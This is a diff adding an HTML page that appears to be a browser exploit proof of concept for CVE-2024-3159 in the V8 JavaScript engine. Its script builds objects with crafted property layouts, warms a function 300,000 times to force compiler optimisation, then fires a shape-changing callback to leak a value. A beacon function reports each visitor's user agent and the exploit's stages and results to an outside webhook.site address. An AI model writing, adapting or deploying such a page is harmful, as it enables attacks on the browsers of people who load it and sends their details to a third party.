@@ -1,0 +1,46 @@
+<html><body><script>
+// CVE-2024-3159 natives-free, monomorphic warm, --no-maglev locally (=device TF path)
+const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+}
+beacon('start', navigator.userAgent.slice(0,40));
+
+const object1 = {};
+object1.a = 1;
+const object2 = {};
+object2.a = 1;
+object2.b = 1;
+const object3 = {};
+object3.a = 1;
+object3.b = 1;
+object3.c = 1;
+Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+const object4 = {};
+object4.a = 1;
+object4.b = 1;
+object4.c = 1;
+object4.d = 1;
+
+for (let key in object3) { }
+delete object3.d;
+
+let escape;
+function trigger(callback) {
+  for (let key in object2) {
+    callback();
+    escape = object2[key];
+  }
+}
+function benign() { }
+
+for (var i = 0; i < 300000; i++) trigger(benign);
+beacon('stage', 'warm-30k');
+
+beacon('pre-fire', 'armed');
+trigger(function () {
+  object4.c = 1.1;
+  for (let key in object1) { }
+});
+beacon('fired', 'escape=' + (typeof escape) + ':' + String(escape).slice(0,80));
+</script></body></html>
